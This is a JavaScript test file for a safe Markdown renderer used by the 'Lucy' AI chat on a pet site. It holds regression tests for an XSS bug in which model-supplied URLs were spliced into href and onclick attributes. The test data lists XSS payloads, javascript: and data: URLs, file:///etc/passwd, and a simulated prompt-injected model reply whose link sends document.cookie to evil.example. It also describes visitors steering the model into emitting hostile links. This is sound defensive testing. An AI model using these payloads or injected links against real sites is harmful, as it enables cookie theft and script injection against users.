'use strict';

/**
 * Browser-side tests for assets/safe-markdown.js.
 *
 * These are the regression tests for the Lucy link-rendering vulnerability: the
 * old renderer concatenated an AI-supplied URL into an `href="..."` attribute
 * AND into an inline `onclick="...('URL')"` handler, so a model reply (which a
 * visitor can steer) could break out of the attribute or supply a
 * `javascript:` URL.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { JSDOM } = require('jsdom');

const SOURCE = fs.readFileSync(path.resolve(__dirname, '../assets/safe-markdown.js'), 'utf8');

function browser(url) {
  const dom = new JSDOM('<!doctype html><body><div id="out"></div></body>', {
    url: url || 'https://petsinmycity.com/lucy/',
    runScripts: 'outside-only',
  });
  dom.window.eval(SOURCE);
  return dom;
}

function renderToElement(markdown, url) {
  const dom = browser(url);
  const el = dom.window.document.getElementById('out');
  dom.window.PIMCSafeMarkdown.renderInto(el, markdown);
  return { dom: dom, el: el, html: el.innerHTML };
}


/**
 * The property that actually matters: whatever ended up in the DOM is inert.
 *
 * Asserting on the raw innerHTML string is misleading, because a rejected
 * payload is correctly rendered as ESCAPED TEXT - so the characters
 * "onerror=" can legitimately appear in the serialization while being a text
 * node that no browser will ever execute. These checks look at the DOM.
 */
function assertInert(el, label) {
  const note = label ? ' [' + label + ']' : '';
  for (const tag of ['script', 'img', 'svg', 'iframe', 'object', 'embed', 'link', 'style', 'form']) {
    assert.equal(el.querySelector(tag), null, 'created a <' + tag + '>' + note);
  }
  for (const node of el.querySelectorAll('*')) {
    for (const attr of node.attributes) {
      assert.ok(!attr.name.toLowerCase().startsWith('on'),
        'inline handler ' + attr.name + ' on <' + node.tagName + '>' + note);
    }
  }
  for (const a of el.querySelectorAll('a')) {
    const href = a.getAttribute('href') || '';
    assert.ok(!/^\s*(javascript|data|vbscript|file|blob|about):/i.test(href), 'unsafe href ' + href + note);
  }
}

test('a normal relative link becomes a same-origin anchor', () => {
  const { el } = renderToElement('Try [Pet Insurance](/pet-insurance/) today.');
  const a = el.querySelector('a');
  assert.equal(a.getAttribute('href'), '/pet-insurance/');
  assert.equal(a.getAttribute('target'), null);
  assert.match(a.textContent, /Pet Insurance/);
});

test('an approved external link gets noopener and noreferrer', () => {
  const { el } = renderToElement('[Find a vet](https://www.google.com/maps/search/veterinarian+near+60601)');
  const a = el.querySelector('a');
  assert.equal(a.getAttribute('target'), '_blank');
  const rel = a.getAttribute('rel').split(/\s+/);
  assert.ok(rel.includes('noopener'));
  assert.ok(rel.includes('noreferrer'));
});

test('an affiliate destination is marked sponsored', () => {
  const { el } = renderToElement('[Shop on Chewy](https://www.chewy.com/deals)');
  const rel = el.querySelector('a').getAttribute('rel').split(/\s+/);
  assert.ok(rel.includes('sponsored'), rel.join(' '));
  assert.ok(rel.includes('noopener'));
  assert.ok(rel.includes('noreferrer'));
});

test('no inline event handler is ever produced', () => {
  const { el, html } = renderToElement('[Track me](https://www.chewy.com/x) and [Home](/)');
  assert.ok(!/onclick|onerror|onload|onmouseover|onfocus/i.test(html), html);
  for (const a of el.querySelectorAll('a')) {
    for (const attr of a.attributes) {
      assert.ok(!attr.name.toLowerCase().startsWith('on'), attr.name);
    }
  }
});

test('script URLs are refused and rendered as plain text', () => {
  const hostile = [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'java\tscript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'about:blank',
    'blob:https://petsinmycity.com/abc',
  ];
  for (const url of hostile) {
    const { el } = renderToElement('[click me](' + url + ')');
    assert.equal(el.querySelector('a'), null, 'anchor created for ' + url);
    assertInert(el, url);
    assert.match(el.textContent, /click me/, 'the label text is preserved');
  }
});

test('quote-based attribute injection cannot escape into markup', () => {
  const payloads = [
    '"onmouseover="alert(1)',
    '"/onfocus=alert(1)//',
    "'onclick='alert(1)",
    '/><img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    'https://petsinmycity.com/"onmouseover="alert(1)',
    "https://petsinmycity.com/');alert(1);//",
    '/path"><svg onload=alert(1)>',
  ];
  for (const payload of payloads) {
    const { dom, el } = renderToElement('[safe label](' + payload + ')');
    // Rejected payloads are rendered as escaped TEXT, so the characters may
    // still appear in innerHTML. What matters is that nothing is executable.
    assertInert(el, payload);
    // Some payloads are still syntactically valid same-site URLs. Those may
    // become links - safely: the href is set with setAttribute on a DOM node,
    // never spliced into an HTML string, so a quote in it cannot terminate an
    // attribute. What must hold is that the destination is still ours.
    for (const a of el.querySelectorAll('a')) {
      const href = a.getAttribute('href');
      const resolved = new dom.window.URL(href, 'https://petsinmycity.com/');
      assert.equal(resolved.origin, 'https://petsinmycity.com', payload + ' -> ' + href);
    }
    dom.window.close();
  }
});

test('a label containing markup is inserted as text, not parsed', () => {
  const { el } = renderToElement('[<img src=x onerror=alert(1)>](/safe/)');
  assertInert(el);
  // The label survives as literal text inside the anchor.
  assert.match(el.textContent, /<img src=x onerror=alert\(1\)>/);
  assert.equal(el.querySelector('a').getAttribute('href'), '/safe/');
});

test('off-allow-list external destinations are dropped', () => {
  for (const url of [
    'https://evil.example/steal',
    'https://petsinmycity.com.evil.example/steal',
    'https://google.com.attacker.test/x',
    'http://petsinmycity.com/insecure',
  ]) {
    const { el } = renderToElement('[go](' + url + ')');
    assert.equal(el.querySelector('a'), null, url);
  }
});

test('URLs with embedded credentials are rejected', () => {
  for (const url of [
    'https://user:pass@www.chewy.com/x',
    'https://admin@petsinmycity.com/x',
  ]) {
    assert.equal(browser().window.PIMCSafeMarkdown.isAllowedUrl(url), null, url);
  }
});

test('control characters in a URL are rejected', () => {
  const dom = browser();
  const withNull = 'https://www.chewy.com/' + String.fromCharCode(0) + 'x';
  const withNewline = 'https://www.chewy.com/\nx';
  assert.equal(dom.window.PIMCSafeMarkdown.isAllowedUrl(withNull), null);
  assert.equal(dom.window.PIMCSafeMarkdown.isAllowedUrl(withNewline), null);
});

test('protocol-relative URLs cannot become a different origin', () => {
  const dom = browser();
  assert.equal(dom.window.PIMCSafeMarkdown.isAllowedUrl('//evil.example/x'), null);
  assert.equal(dom.window.PIMCSafeMarkdown.isAllowedUrl('///evil.example/x'), null);
});

test('malformed Markdown degrades to plain text without throwing', () => {
  const cases = [
    '[unclosed(https://www.chewy.com/x)',
    '[label]no-parens',
    '[](/empty-label/)',
    '[a](',
    '](x)',
    '[[nested]](/x/)',
    '**unclosed bold',
    '[a](/x/) [b](/y/) [c](javascript:alert(1))',
    '[' + 'x'.repeat(5000) + '](/x/)',
  ];
  for (const markdown of cases) {
    const { el } = renderToElement(markdown);
    assert.ok(el, markdown);
    assert.ok(!/javascript:/i.test(el.innerHTML), markdown);
  }
});

test('a prompt-injected reply full of hostile links executes nothing', () => {
  const injected = [
    'Sure! Here you go:',
    '',
    '[Claim your prize](javascript:fetch("https://evil.example/?c="+document.cookie))',
    '[Update details](https://evil.example/phish)',
    '[Vet near you](" onmouseover="alert(document.domain))',
    '[Normal link](/find-a-vet/)',
  ].join('\n');
  const { el } = renderToElement(injected);
  assertInert(el);
  const anchors = el.querySelectorAll('a');
  // Only the one allow-listed destination survives as a link. Everything the
  // injection asked for is inert text.
  assert.equal(anchors.length, 1);
  assert.equal(anchors[0].getAttribute('href'), '/find-a-vet/');
  for (const a of anchors) {
    assert.ok(!/evil\.example/.test(a.getAttribute('href')));
  }
});

test('bold and paragraphs still render', () => {
  const { el } = renderToElement('**Important**\n\nSecond paragraph\nwith a break.');
  assert.equal(el.querySelectorAll('p').length, 2);
  assert.equal(el.querySelector('strong').textContent, 'Important');
  assert.equal(el.querySelectorAll('br').length, 1);
});

test('renderInto replaces previous content rather than appending', () => {
  const dom = browser();
  const el = dom.window.document.getElementById('out');
  dom.window.PIMCSafeMarkdown.renderInto(el, 'first');
  dom.window.PIMCSafeMarkdown.renderInto(el, 'second');
  assert.equal(el.textContent, 'second');
});

test('assets/lucy.js no longer contains the unsafe renderer', () => {
  const lucy = fs.readFileSync(path.resolve(__dirname, '../assets/lucy.js'), 'utf8');
  assert.ok(!/onclick="[^"]*__lucyTrackLink/.test(lucy));
  assert.ok(!/'<a class="lucy-link-btn" href="'/.test(lucy));
  assert.ok(!/renderMarkdownLite/.test(lucy));
});

test('lucy/index.html no longer contains the unsafe renderer', () => {
  const page = fs.readFileSync(path.resolve(__dirname, '../lucy/index.html'), 'utf8');
  assert.ok(!/onclick=\\"window.__lucyTrack/.test(page));
  assert.ok(!/'<a class="lucy-link-btn" href="'/.test(page));
});

test('no browser script builds an anchor href from a concatenated variable', () => {
  const assetsDir = path.resolve(__dirname, '../assets');
  const offenders = [];
  for (const file of fs.readdirSync(assetsDir)) {
    if (!file.endsWith('.js')) continue;
    const source = fs.readFileSync(path.join(assetsDir, file), 'utf8');
    // `<a ... href="' + something` is the exact shape of the original bug.
    if (/<a\b[^'"]*href=\\?["']'\s*\+/.test(source)) offenders.push(file);
  }
  assert.deepEqual(offenders, []);
});
